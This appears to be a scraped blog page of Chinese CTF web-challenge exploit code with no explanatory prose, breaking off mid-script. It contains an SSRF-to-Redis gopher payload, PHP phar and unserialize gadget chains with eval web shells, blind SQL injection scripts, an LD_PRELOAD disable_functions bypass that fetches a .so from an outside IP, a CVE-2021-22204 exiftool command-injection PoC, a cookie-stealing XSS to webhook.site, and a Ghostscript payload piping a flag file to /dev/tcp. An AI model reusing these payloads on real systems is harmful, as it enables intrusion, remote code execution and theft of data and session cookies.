&quot;gopher://redis:</span><br><span class="line">6379/_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%246%0D%0A123456%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Ahttp%3A%2F%2Fexp%0D%0A%24652%0D%0AO%3A34%3A%22EasySwoole%5CHttp%5CMessage%5CUploadFile%22%3A1%3A%7Bs%3A6%3A%22stream%22%3BO%3A32%3A%22Prophecy%5CProphecy%5CObjectProphecy%22%3A2%3A%7Bs%3A10%3A%22lazyDouble%22%3BO%3A27%3A%22Prophecy%5CDoubler%5CLazyDouble%22%3A4%3A%7Bs%3A7%3A%22doubler%22%3BO%3A24%3A%22Prophecy%5CDoubler%5CDoubler%22%3A4%3A%7Bs%3A6%3A%22mirror%22%3BO%3A38%3A%22Prophecy%5CDoubler%5CGenerator%5CClassMirror%22%3A0%3A%7B%7Ds%3A7%3A%22creator%22%3BO%3A39%3A%22Prophecy%5CDoubler%5CGenerator%5CClassCreator%22%3A1%3A%7Bs%3A9%3A%22generator%22%3BO%3A38%3A%22PHPUnit%5CFramework%5CMockObject%5CMockTrait%22%3A2%3A%7Bs%3A9%3A%22classCode%22%3Bs%3A50%3A%22throw%20new%20ErrorException%28shell_exec%28%22%2Freadflag%22%29%29%3B%22%3Bs%3A8%3A%22mockName%22%3Bs%3A0%3A%22%22%3B%7D%7Ds%3A5%3A%22namer%22%3BO%3A30%3A%22Prophecy%5CDoubler%5CNameGenerator%22%3A0%3A%7B%7Ds%3A7%3A%22patches%22%3Ba%3A0%3A%7B%7D%7Ds%3A8%3A%22argument%22%3Ba%3A0%3A%7B%7Ds%3A5%3A%22class%22%3BN%3Bs%3A10%3A%22interfaces%22%3Ba%3A0%3A%7B%7D%7Ds%3A8%3A%22revealer%22%3Br%3A2%3B%7D%7D%0D%0A&quot;</span><br><span class="line"></span><br><span class="line">r = requests.get(url,params=&#123;&quot;url&quot;:</span><br><span class="line">data&#125;)</span><br><span class="line"># print(r.text)</span><br><span class="line">r = requests.get(url,params=&#123;&quot;url&quot;:&quot;http://exp&quot;&#125;)</span><br><span class="line">r = re.findall(r&#x27;(flag&#123;[0-9a-f-]+&#125;)&#x27;,r.text)</span><br><span class="line">print(r[0])</span><br><span class="line">curl http://127.0.0.1/user/change -H &quot;Content-Type: application/json&quot; -H &quot;Cookie: ctf=这里是你自己的值&quot; -d &#x27;&#123;&quot;bio&quot;:&quot;sss&quot;,&quot;username&quot;:&quot;admin&quot;,&quot;op&quot;:&quot;UPP.save&quot;&#125;&#x27;</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">for i in range(0,10485760):</span><br><span class="line"> m = hashlib.md5()</span><br><span class="line"> b = str(i).encode(encoding=&#x27;utf-8&#x27;)</span><br><span class="line"> m.update(b)</span><br><span class="line"> md = m.hexdigest()</span><br><span class="line"> </span><br><span class="line"> if md[0:6] == &#x27;7c0d5f&#x27;:</span><br><span class="line">   print(i)</span><br><span class="line">   break</span><br><span class="line">__proto__[tagReplacementText]=&amp;name=&lt;sss&gt;&amp;passwd=navigator.sendBeacon(`https://webhook.site/67012a5d-b312-4786-8c6c-cab47a7aa7ea`,document.cookie)</span><br><span class="line">&lt;?php</span><br><span class="line">include_once &quot;classTest.php&quot;;</span><br><span class="line"></span><br><span class="line">$dbms=&#x27;mysql&#x27;;     //数据库类型</span><br><span class="line">$host=&#x27;localhost&#x27;; //数据库主机名</span><br><span class="line">$dbName=&#x27;test&#x27;;    //使用的数据库</span><br><span class="line">$user=&#x27;root&#x27;;      //数据库连接用户名</span><br><span class="line">$pass=&#x27;&#x27;;          //对应的密码</span><br><span class="line">$dsn=&quot;uri:</span><br><span class="line">phar://phar.phar/$dbms:</span><br><span class="line">host=$host;dbname=$dbName&quot;;</span><br><span class="line"></span><br><span class="line">try &#123;</span><br><span class="line">    $dbh = new PDO($dsn, $user, $pass); //初始化一个PDO对象</span><br><span class="line">    echo &quot;连接成功</span><br><span class="line">&quot;;</span><br><span class="line">    $dbh = null;</span><br><span class="line">&#125; catch (PDOException $e) &#123;</span><br><span class="line">    die (&quot;Error!: &quot; . $e-&gt;getMessage() . &quot;</span><br><span class="line">&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$db = new PDO($dsn, $user, $pass, array(PDO::</span><br><span class="line">ATTR_PERSISTENT =&gt; true));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace NetteDIConfigAdapters&#123;</span><br><span class="line">    class PhpAdapter&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace NetteDatabaseTable &#123;</span><br><span class="line"></span><br><span class="line">    use NetteDIConfigAdaptersPhpAdapter;</span><br><span class="line"></span><br><span class="line">    class SqlBuilder</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class Selection</span><br><span class="line">    &#123;</span><br><span class="line">        protected $observeCache;</span><br><span class="line">        protected $sqlBuilder;</span><br><span class="line">        protected $accessedColumns;</span><br><span class="line">        protected $previousAccessedColumns;</span><br><span class="line">        protected $generalCacheKey;</span><br><span class="line">        protected $cache;</span><br><span class="line"></span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;observeCache = $this;</span><br><span class="line">            $this-&gt;cache = new PhpAdapter();</span><br><span class="line">            $this-&gt;sqlBuilder = new SqlBuilder();</span><br><span class="line">            $this-&gt;accessedColumns = &quot;1&quot;;</span><br><span class="line">            $this-&gt;generalCacheKey = &quot;/etc/passwd&quot;; //需要包含的文件</span><br><span class="line">            $this-&gt;previousAccessedColumns = &quot;222&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line"></span><br><span class="line">    use NetteDatabaseTableSelection;</span><br><span class="line">    $poc = new Selection();</span><br><span class="line">    echo urlencode(serialize($poc));</span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">    $phar-&gt;setMetadata($poc); //将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">    //签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace NetteDIConfigAdapters&#123;</span><br><span class="line">    class PhpAdapter&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace NetteDatabaseTable &#123;</span><br><span class="line"></span><br><span class="line">    use NetteDIConfigAdaptersPhpAdapter;</span><br><span class="line"></span><br><span class="line">    class SqlBuilder</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class Selection</span><br><span class="line">    &#123;</span><br><span class="line">        protected $observeCache;</span><br><span class="line">        protected $sqlBuilder;</span><br><span class="line">        protected $accessedColumns;</span><br><span class="line">        protected $previousAccessedColumns;</span><br><span class="line">        protected $generalCacheKey;</span><br><span class="line">        protected $cache;</span><br><span class="line"></span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;observeCache = $this;</span><br><span class="line">            $this-&gt;cache = new PhpAdapter();</span><br><span class="line">            $this-&gt;sqlBuilder = new SqlBuilder();</span><br><span class="line">            $this-&gt;accessedColumns = &quot;1&quot;;</span><br><span class="line">            $this-&gt;generalCacheKey = &quot;/tmp/install.lock&quot;; //需要包含的文件</span><br><span class="line">            $this-&gt;previousAccessedColumns = &quot;222&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line"></span><br><span class="line">    use NetteDatabaseTableSelection;</span><br><span class="line">    $poc = new Selection();</span><br><span class="line">//    echo urlencode(serialize($poc));</span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php eval($_REQUEST[0]);__HALT_COMPILER(); ?&gt;&quot;); //shell放在stub前面</span><br><span class="line">    $phar-&gt;setMetadata($poc); //将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;123&quot;); //添加要压缩的文件</span><br><span class="line">    //签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">    echo urlencode(serialize(file_get_contents(&quot;phar.phar&quot;)));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">GET /install.php?ip=127.0.0.1&amp;content=s%3A461%3A%22%3C%3Fphp+eval%28%24_REQUEST%5B0%5D%29%3B__HALT_COMPILER%28%29%3B+%3F%3E%0D%0Az%01%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00D%01%00%00O%3A30%3A%22Nette%5CDatabase%5CTable%5CSelection%22%3A6%3A%7Bs%3A15%3A%22%00%2A%00observeCache%22%3Br%3A1%3Bs%3A13%3A%22%00%2A%00sqlBuilder%22%3BO%3A31%3A%22Nette%5CDatabase%5CTable%5CSqlBuilder%22%3A0%3A%7B%7Ds%3A18%3A%22%00%2A%00accessedColumns%22%3Bs%3A1%3A%221%22%3Bs%3A26%3A%22%00%2A%00previousAccessedColumns%22%3Bs%3A3%3A%22222%22%3Bs%3A18%3A%22%00%2A%00generalCacheKey%22%3Bs%3A17%3A%22%2Ftmp%2Finstall.lock%22%3Bs%3A8%3A%22%00%2A%00cache%22%3BO%3A35%3A%22Nette%5CDI%5CConfig%5CAdapters%5CPhpAdapter%22%3A0%3A%7B%7D%7D%08%00%00%00test.txt%03%00%00%00%8464b%03%00%00%00%D2cH%88%A4%01%00%00%00%00%00%00123%EF.c%C3%26%F0%F2%2F%84B%E6%0B%8E%8B%EC%09k3%E0%BB%02%00%00%00GBMB%22%3B&amp;step=2&amp;action=%E5%AE%89%E8%A3%85 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:</span><br><span class="line">888</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: _nss=1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">GET /install.php?type=uri:</span><br><span class="line">phar:///tmp/install.lock/mysql&amp;ip=127.0.0.1&amp;db=mysql&amp;step=1&amp;action=%E5%AE%89%E8%A3%85 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:</span><br><span class="line">888</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://127.0.0.1:</span><br><span class="line">888/install.php</span><br><span class="line">Cookie: _nss=1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">import xlwt</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url=&quot;http://IP:</span><br><span class="line">PORT/index.php?id=1%27&quot;</span><br><span class="line">def write_execl(ord_id):</span><br><span class="line"> wb = xlwt.Workbook();</span><br><span class="line"> ws = wb.add_sheet(&quot;sheet1&quot;)</span><br><span class="line"> ws.write(0,0,ord_id)</span><br><span class="line"> ws.write(0,1,&#x27;b&#x27;)</span><br><span class="line"> ws.write(0,2,&#x27;c&#x27;)</span><br><span class="line"> wb.save(&quot;ok.xls&quot;)</span><br><span class="line">def sqli():</span><br><span class="line"> flag=&#x27;&#x27;</span><br><span class="line"> sql_str=&quot;abcdeflagQWERTYUIOPASDFGHJKLZXCVBNM1234567890-&#123;&#125;&quot;</span><br><span class="line"> for i in range(1,20):</span><br><span class="line">  for s in sql_str:</span><br><span class="line">   startTime=time.time()</span><br><span class="line">   sql_payload=&quot;123123&#x27; oorr case when(substr((selselectect group_concat(flag) from flag) from &#123;&#125; foorr 1 )=&#x27;&#123;&#125;&#x27;) then sleep(5) else 1 end -- a&quot;.format(i,s)</span><br><span class="line">   print(sql_payload)</span><br><span class="line">   write_execl(sql_payload)</span><br><span class="line">   file=&#123;&#x27;file&#x27;:</span><br><span class="line">open(&#x27;ok.xls&#x27;,&#x27;rb&#x27;)&#125;</span><br><span class="line">   r=requests.post(url,files=file)</span><br><span class="line">   if time.time()-startTime&gt;4:</span><br><span class="line">    print(s)</span><br><span class="line">    flag=flag+s</span><br><span class="line">    break</span><br><span class="line"> print(flag)</span><br><span class="line">sqli()</span><br><span class="line">&lt;?php</span><br><span class="line">function request_by_curl($remote_server, $post_string) &#123;</span><br><span class="line">  $ch = curl_init();</span><br><span class="line">  curl_setopt($ch, CURLOPT_URL, $remote_server);</span><br><span class="line">  curl_setopt($ch, CURLOPT_POSTFIELDS, $post_string);</span><br><span class="line">  curl_setopt($ch, CURLOPT_USERAGENT, &quot;&quot;);</span><br><span class="line">  $data = curl_exec($ch);</span><br><span class="line">  curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function go($func,$args)&#123;</span><br><span class="line">  return pack(&quot;lllllla*a*&quot;, 0, 0, 0, 0, strlen($func), strlen($args), $func, $args);</span><br><span class="line">&#125;</span><br><span class="line">request_by_curl(&#x27;http://127.0.0.1/index.php&#x27;, go($_GET[&#x27;cmd&#x27;],$_GET[&#x27;args&#x27;]));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"># http://127.0.0.1/poc.php?cmd=phpinfo&amp;args=-1</span><br><span class="line">&lt;?php</span><br><span class="line">namespace Ctf&#123;</span><br><span class="line">    class Treeting&#123;</span><br><span class="line">        private $token;</span><br><span class="line">        private $key;</span><br><span class="line">        private $cmd;</span><br><span class="line">        private $args;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;token = array(1);</span><br><span class="line">            $this-&gt;key = array(2);</span><br><span class="line">            $this-&gt;cmd = &quot;var_dumpvar_dump&quot;;</span><br><span class="line">            $this-&gt;args = base64_encode(&#x27;2;&#125;eval($_GET[0]);/*&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace&#123;</span><br><span class="line">    $a = new CtfTreeting();</span><br><span class="line">    $poc =  serialize($a);</span><br><span class="line">    $poc = str_replace(&quot;T&quot;,&quot;G&quot;,$poc);</span><br><span class="line">    echo urlencode($poc);</span><br><span class="line">    // unserialize($poc);</span><br><span class="line">&#125;</span><br><span class="line"># O%3A12%3A%22Ctf%5CGreeting%22%3A4%3A%7Bs%3A19%3A%22%00Ctf%5CGreeting%00token%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A1%3B%7Ds%3A17%3A%22%00Ctf%5CGreeting%00key%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A2%3B%7Ds%3A17%3A%22%00Ctf%5CGreeting%00cmd%22%3Bs%3A16%3A%22var_dumpvar_dump%22%3Bs%3A18%3A%22%00Ctf%5CGreeting%00args%22%3Bs%3A28%3A%22Mjt9ZXZhbCgkX0dFVFswXSk7Lyo%3D%22%3B%7D</span><br><span class="line">    #define _GNU_SOURCE</span><br><span class="line">    #include &lt;stdlib.h&gt;</span><br><span class="line">    #include </span><br><span class="line">    #include &lt;sys/types.h&gt;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void angel (void)&#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line"> const char* cmdline = getenv(&quot;CMD&quot;);</span><br><span class="line"> system(cmdline);</span><br><span class="line">&#125;</span><br><span class="line">&lt;?php</span><br><span class="line">function request_by_curl($remote_server, $post_string) &#123;</span><br><span class="line">  $ch = curl_init();</span><br><span class="line">  curl_setopt($ch, CURLOPT_URL, $remote_server);</span><br><span class="line">  curl_setopt($ch, CURLOPT_POSTFIELDS, $post_string);</span><br><span class="line">  curl_setopt($ch, CURLOPT_USERAGENT, &quot;&quot;);</span><br><span class="line">  $data = curl_exec($ch);</span><br><span class="line">  curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function go($func,$args)&#123;</span><br><span class="line">  return pack(&quot;lllllla*a*&quot;, 0, 0, 0, 0, strlen($func), strlen($args), $func, $args);</span><br><span class="line">&#125;</span><br><span class="line">// $poc = &lt;&lt;&lt; EOF</span><br><span class="line">// copy(&quot;http://20.1.1.189:</span><br><span class="line">999/1.so&quot;,&quot;/tmp/1&quot;);putenv(&quot;CMD=/readflag&gt;/flag&quot;);putenv(&quot;LD_PRELOAD=/tmp/1&quot;);mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);readfile(&#x27;/tmp/flag&#x27;);</span><br><span class="line">// EOF;</span><br><span class="line">$poc = &lt;&lt;&lt; EOF</span><br><span class="line">putenv(&quot;CMD=/readflag&gt;/tmp/flag&quot;);putenv(&quot;LD_PRELOAD=/tmp/1&quot;);mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);include(&#x27;/tmp/flag&#x27;);</span><br><span class="line">EOF;</span><br><span class="line"></span><br><span class="line">request_by_curl(&#x27;http://127.0.0.1:</span><br><span class="line">888/index.php&#x27;.&#x27;?0=&#x27;.$poc, go($_GET[&#x27;cmd&#x27;],$_GET[&#x27;args&#x27;]));</span><br><span class="line">?&gt;</span><br><span class="line">GET /poc.php?cmd=unserialize&amp;args=O%3A12%3A%22Ctf%5CGreeting%22%3A4%3A%7Bs%3A19%3A%22%00Ctf%5CGreeting%00token%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A1%3B%7Ds%3A17%3A%22%00Ctf%5CGreeting%00key%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A2%3B%7Ds%3A17%3A%22%00Ctf%5CGreeting%00cmd%22%3Bs%3A16%3A%22var_dumpvar_dump%22%3Bs%3A18%3A%22%00Ctf%5CGreeting%00args%22%3Bs%3A28%3A%22Mjt9ZXZhbCgkX0dFVFswXSk7Lyo%3D%22%3B%7D HTTP/1.1</span><br><span class="line">Host: 0.0.0.0:</span><br><span class="line">800</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:99.0) Gecko/20100101 Firefox/99.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: tracy-session=436e349820; _nss=1; PHPSESSID=3jn67ujcvbcurso8cli2grh670</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line">#!/usr/bin/perl</span><br><span class="line">use strict;</span><br><span class="line">use warnings;</span><br><span class="line"></span><br><span class="line">my $poc_imgfile = &#x27;notevil.jpg&#x27;;</span><br><span class="line">my $outfile = &#x27;ant.out&#x27;;</span><br><span class="line">my $djvumake = &quot;djvumake $poc_imgfile INFO=0,0 BGjp=/dev/null ANTa=$outfile&quot;;</span><br><span class="line"></span><br><span class="line">sub usage &#123;</span><br><span class="line">    print &quot;POC-CVE-2021-22204n&quot;;</span><br><span class="line">    print &quot;Usage $0 &lt;cmd to inject&gt; n&quot;;</span><br><span class="line">    print &quot;tNote: if your cmd contains unix special characters use quote!n&quot;;</span><br><span class="line">    print &quot;tEG: $0 &quot;curl xxxx.com/script.sh|sh&quot;n&quot;;</span><br><span class="line">    print &quot;This poc generates an image file ($poc_imgfile) to be proccessed by vulnerable exiftool.n&quot;;</span><br><span class="line">    print &quot;And requires DjVuLibre to be installed and in PATHn&quot;;</span><br><span class="line">    print &quot;t See: http://djvu.sourceforge.net/n&quot;;</span><br><span class="line">    print &quot;---nn&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub main &#123;</span><br><span class="line">    # search args for cmd to inject</span><br><span class="line">    my $args = join(&#x27; &#x27;, @ARGV);</span><br><span class="line">    my $cmd = $args || &#x27;curl http://google.com&#x27;;</span><br><span class="line"></span><br><span class="line">    print &quot;[+] Preparing annotation file.n&quot;;</span><br><span class="line">    open(FH, &#x27;&gt;&#x27;, $outfile) or die $!;</span><br><span class="line">    while (&lt;DATA&gt;) &#123;</span><br><span class="line">        s/##/$cmd/;</span><br><span class="line">        print FH $_;</span><br><span class="line">    &#125;</span><br><span class="line">    close(FH);</span><br><span class="line"></span><br><span class="line">    print &quot;[+] Creating image file with: $djvumake n&quot;;</span><br><span class="line">    system($djvumake);</span><br><span class="line"></span><br><span class="line">    # remove file</span><br><span class="line">    unlink $outfile;</span><br><span class="line"></span><br><span class="line">    print &quot;[+] $poc_imgfile created.n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">usage();</span><br><span class="line">main();</span><br><span class="line"></span><br><span class="line">__DATA__</span><br><span class="line">(xmp&quot;</span><br><span class="line">&quot;.`/bin/bash -c &#x27;##&#x27;`;#&quot;</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://eci-???.cloudeci1.ichunqiu.com:</span><br><span class="line">8888/&quot;</span><br><span class="line">convert_url = &quot;/convert&quot;</span><br><span class="line">hack_ip = &quot;vps_ip&quot;</span><br><span class="line">res = requests.session()</span><br><span class="line"></span><br><span class="line">get_flag2=f&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt; &lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt; &lt;hui&gt;&lt;desc&gt;copies (%pipe%/temp/;bash -c &#x27;cat /flag2 &gt; /dev/tcp/&#123;hack_ip&#125;/2333&#x27;) (r) file showpage 0 quit &lt;/desc&gt;  &lt;svg width=&quot;1px&quot; height=&quot;1px&quot; /&gt; &lt;/hui&gt;&quot;&quot;&quot;</span><br><span class="line">res.post(url+&quot;/upload&quot;,files=&#123;&quot;file&quot;:</span><br><span class="line">get_flag2&#125;)</span><br><span class="line">res.get(url+convert_url)</span><br><span class="line">// 历史最高分</span><br><span class="line">const BestScoreKey = &#x27;BestScore&#x27;;</span><br><span class="line">// 方格状态和分数</span><br><span class="line">const CellStateKey = &#x27;CellState&#x27;;</span><br><span class="line"></span><br><span class="line">function Storage() &#123;&#125;</span><br><span class="line"></span><br><span class="line">function setData(key,value) &#123;</span><br><span class="line">  var data= new FormData();</span><br><span class="line">  data.append(&#x27;key&#x27;,key);</span><br><span class="line">  data.append(&#x27;value&#x27;,value)</span><br><span class="line">  data.append(&#x27;function&#x27;,&#x27;setData&#x27;);</span><br><span class="line">  var xhttp = new XMLHttpRequest();</span><br><span class="line">  xhttp.open(&quot;POST&quot;, &quot;/&quot;, false);</span><br><span class="line">  xhttp.send(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getData(key) &#123;</span><br><span class="line">  var data= new FormData();</span><br><span class="line">  data.append(&#x27;key&#x27;,key);</span><br><span class="line">  data.append(&#x27;function&#x27;,&#x27;getData&#x27;);</span><br><span class="line">  var xhttp = new XMLHttpRequest();</span><br><span class="line">  xhttp.open(&quot;POST&quot;, &quot;/&quot;, false);</span><br><span class="line">  xhttp.send(data);</span><br><span class="line">  return xhttp.responseText;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Storage.prototype.setBestScore = function(bestScore) &#123;</span><br><span class="line">  setData(BestScoreKey, bestScore);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Storage.prototype.getBestScore = function() &#123;</span><br><span class="line">  return getData(BestScoreKey);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 存储方格状态和分数</span><br><span class="line">Storage.prototype.setCellState = function(&#123; score, grid &#125;) &#123;</span><br><span class="line">  setData(CellStateKey, JSON.stringify(&#123;</span><br><span class="line">      score,</span><br><span class="line">      grid: grid.serialize()</span><br><span class="line">    &#125;));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 获取方格信息</span><br><span class="line">Storage.prototype.getCellState = function() &#123;</span><br><span class="line">  const cellState = getData(CellStateKey);</span><br><span class="line">  return cellState ? JSON.parse(cellState) : null;</span><br><span class="line">&#125;;</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import json</span><br><span class="line">import hmac</span><br><span class="line">import hashlib</span><br><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line">header = &#123;</span><br><span class="line">    &quot;alg&quot;: &quot;SHA256&quot;,</span><br><span class="line">    &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">secret_key = &#x27;keyfe7dc29e5e3d3f066e5a8a15ba135259&#x27;</span><br><span class="line"></span><br><span class="line">def b64_encode(s):</span><br><span class="line">    return base64.b64encode(s)</span><br><span class="line"></span><br><span class="line">def b64_decode(s):</span><br><span class="line">    return base64.b64decode(s)</span><br><span class="line"></span><br><span class="line">def encode_(secret, header, payload):</span><br><span class="line">    header_json = json.dumps(header,separators=(&#x27;,&#x27;, &#x27;:&#x27;), sort_keys=True)</span><br><span class="line">    segments = []</span><br><span class="line">    segments.append(b64_encode(header_json))</span><br><span class="line">    segments.append(b64_encode(payload))</span><br><span class="line">    msg = &#x27;.&#x27;.join(segments)</span><br><span class="line">    hm = hmac.new(secret, msg, digestmod=hashlib.sha256) </span><br><span class="line">    hm_base64 = b64_encode(hm.digest())</span><br><span class="line">    segments.append(hm_base64)</span><br><span class="line">    token = &#x27;.&#x27;.join(segments)</span><br><span class="line">    return token</span><br><span class="line"></span><br><span class="line">def change(source):</span><br><span class="line">    to=&#x27;&#x27;</span><br><span class="line">    for c in source:</span><br><span class="line">        to+=&#x27;\u00&#x27;+hex(ord(c))[2:]</span><br><span class="line">    return to</span><br><span class="line"></span><br><span class="line">headers=&#123;&#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&#x27;&#125;</span><br><span class="line"></span><br><span class="line">url=&#x27;http://IP:</span><br><span class="line">PORT/&#x27;</span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    left=33</span><br><span class="line">    right=128</span><br><span class="line"></span><br><span class="line">    while right-left!=1:</span><br><span class="line">        mid=(left+right)/2</span><br><span class="line">        payload=&quot;&#x27;^(substr((select/**/binary/**/load_file(0x2f666c6167)),&#123;i&#125;,1)&gt;binary/**/&#123;mid&#125;)/**/and/**/sleep(2)^&#x27;&quot;.format(i=i,mid=hex(mid))</span><br><span class="line">        data=&#x27;&#123;&quot;data&quot;:&quot;0&#x27;+change(payload)+&#x27;&quot;&#125;&#x27;</span><br><span class="line">        cookies=&#123;</span><br><span class="line">        &#x27;BestScore&#x27;:</span><br><span class="line">urllib.quote(encode_(secret_key,header,data)),</span><br><span class="line">        